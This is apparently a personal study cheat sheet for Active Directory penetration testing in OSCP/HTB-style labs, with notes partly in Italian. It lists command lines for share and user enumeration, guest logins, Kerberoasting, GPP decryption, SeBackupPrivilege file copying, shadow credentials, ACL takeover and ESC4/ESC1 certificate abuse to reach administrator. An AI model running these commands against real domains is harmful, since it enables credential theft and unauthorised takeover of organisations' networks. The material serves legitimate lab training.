# Table of Content
<!-- TOC -->

- [Table of Content](#table-of-content)
- [Useful links](#useful-links)
- [Enumeration](#enumeration)
    - [Tools](#tools)
    - [Default credentials](#default-credentials)
    - [SMBclient recursively get all](#smbclient-recursively-get-all)
    - [Exposed clear domain Group Policy GPP](#exposed-clear-domain-group-policy-gpp)
- [Privilege Escalation](#privilege-escalation)
    - [Enumeration](#enumeration)
        - [Bloodhound](#bloodhound)
    - [SeBackupPrivilege](#sebackupprivilege)
    - [Certipy-AD](#certipy-ad)
    - [WriteOwner privilege](#writeowner-privilege)
    - [Grant FullControl rights](#grant-fullcontrol-rights)
    - [Kerberos Certificate Misconfiguration exploit](#kerberos-certificate-misconfiguration-exploit)
        - [ESC4](#esc4)
        - [ESC1](#esc1)
- [notes from adri TODO](#notes-from-adri-todo)

<!-- /TOC -->

# Useful links

 - [Active Directory Pentest MindMap](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg)
 - [0-9 Guide to Active Directory Attacks](https://zer1t0.gitlab.io/posts/attacking_ad/)
 - [OSCP-like Labs and Machines](https://docs.google.com/spreadsheets/d/18weuz_Eeynr6sXFQ87Cd5F0slOj9Z6rt/edit?pli=1&gid=487240997#gid=487240997)

# Enumeration
search for:
- shares
- groups
- RIDs

\
try using default credentials like `guest` and no password\
repeat enumeration with any other users you find access to

## Privilege Escalation
- check permission: `whoami /all`
- search for vulnerable certificates
- winPEAS

### Bloodhound
1. Collect data
    - `bloodhound-python -u {user} -p {password} -d {domain} -ns ip -c All`
    - `nxc ldap {host} -u {user} -p {password} --bloodhound -c All`
2. Import and query

## Tools
1. crackmapexec:
    - `crackmapexec smb {host} --shares {-u '' -p ''}`
    - `crackmapexec smb {host} --rid-brute`
2. nxc:
    - `nxc smb {host} --shares {-u guest -p ''}`
    - `nxc ldap {host} {-M group-mem -o group="Remote Managment Users"}`
    - `nxc smb {host} --rid-brute`
    - `nxc smb {host} --users`
3. smbclient:
    - `smbclient -L HOST`
    - `smbclient HOST\SHARE {- U user%password}`
4. impacket:
    - `impacket-lookupsid {host} {-no-pass}`
5. evilwinrm:
    - use it every time with every new users and {password} you find. Also check it with `nxc ldap` because sometimes it doesnt work
6. smbmap:
    - `smbmap -H {target}`

## Default credentials
- smb: `-u 'guest' -p ''`

## SMBclient recursively get all 
```
mask "";
recurse ON;
prompt OFF;
mget *;
```

## Exposed clear domain Group Policy (GPP)
if you find GPP on the smb shares or somewhere, Microsoft pubblished the static AES key. [Learn more here.](https://www.mindpointgroup.com/blog/privilege-escalation-via-group-policy-preferences-gpp)
- you can use `gpp-decrypt` to crack it.

## Kerberoasting TODO study better: HTB [kerberos](https://academy.hackthebox.com/module/details/25)
enumerate possibile movement with Kerberos using:
- `impacket-GetNPUsers {domain} -userfile users.txt {-format hashcat -outputfile output.txt}`
- `nxc ldap {domain} -u user.txt -p passwords.txt --asreproast output.txt`
- `impacket-GetUserSPNs {domain} -no--preauth -userfile users.txt -dc-ip {ip}`
## SeBackupPrivilege
Enable privileges using [giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege.git) github repository.

```PS
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

Set-SeBackupPrivilege
Get-SeBackupPrivilege

# Retrieve sensitive files
Copy-FileSeBackupPrivilege C:\Users\Administrator\flag.txt C:\Users\Public\flag.txt -Overwrite
```

## Certipy-AD
when you already have a user you can try to extract hashes for other users:
- `certipy-ad shadow auto -u '{user}@{domain}' -p "{password}" -account '{target_user}' -dc-ip '{ip}'`

and also search for vulnerable certificates if you can access the CA_SVC account:
- `certipy-ad find -u {user}@{domain} -hashes :{hash} -stdout -vulnerable -dc-ip {ip} {-old-bloodhound}`

## WriteOwner privilege
- bloodyAD:\
    `bloodyAD --host '{ip}' -d '{domain}' -u '{user}' -p '{password}' set owner '{target_user}' '{user}'`
- impacket:\
`impacket-owneredit -action write -new-owner '{user}' -target '{target_user}' 'domain'/'{user}':'{password}'`
- PowerView:\
`Set-DomainObjectOwner -TargetIdentity {target_user} -PrincipalIdentity {user}`

## Grant FullControl rights
- PowerView
`Add-DomainObjectAcl -TargetIdentity {target_user} -PrincipalIdentity {user} -Rights fullcontrol`
- impacket
`impacket-dacledit -action write -rights FullControl -principal {user} -target {target_user} {domain}/{user}:{password}`

## Kerberos Certificate Misconfiguration exploit

Weak ACLs refer to access control entries (ACEs) that grant excessive permissions to unauthorized users or groups. hese permissions allow attackers to modify the template’s properties or even the ACL itself, potentially leading to domain escalation.

Requirements (any):
```
Rights 	        |   Description
----------------------------------------------------------------------------
Owner 	        |   Implicit full control of object, all properties can be edited
WriteOwner 	    |   Can modify the owner to an attacker-controlled principal
WriteDacl 	    |   Can modify rights to grant attacker FullControl rights
WriteProperty 	|   Can edit all properties
FullControl 	|   Full control of object, all properties can be edited
```

### ESC4
ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.
- update certificate cache to the vulnerable one:   \
`KRB5CCNAME=$PWD/{user}.ccache certipy-ad template -k -template {vulnerable_template_anem} -dc-ip {ip} -target {dc.domain}`
- then requests the certificate for the user you want to escalate to, using that template:\
`certipy-ad req -u {user} -hashes '{hash}' -ca {CN: certificate_subject} -target {domain} -dc-ip  {ip}  -template DunderMifflinAuthentication -upn administrator@{domain} -ns  {ip}  -dns  {ip}  -debug`
- finally you get the hash using the export pfx file:\
`certipy-ad auth -pfx administrator_10.pfx  -domain {domain}`

so you log in with evil-winrm using the second part of the HASH

### ESC1

ESC1 is the label for a category of misconfigurations that allows attackers to trick AD CS into issuing them certificates that they can use to authenticate as privileged users.


## notes from adri TODO

utile anche usare nxc con --debug

a volte nxc si autentica ma altri tool no. Anche bloodhound. Cercando si nota che quando l'autenticazione funziona è perchè va trmaite Kerboros quindi va usata l'opzione -k

impacket-gettgt to bypass all and authenticate with kerberos


guarda il gruppo remote managment con bloodhound e marca come high value gli utenti che ne fanno parte

ogni volta che fai un upadte di utenzza gruppo ecc, bisdogna rigenerare il TGT kerberos se usato
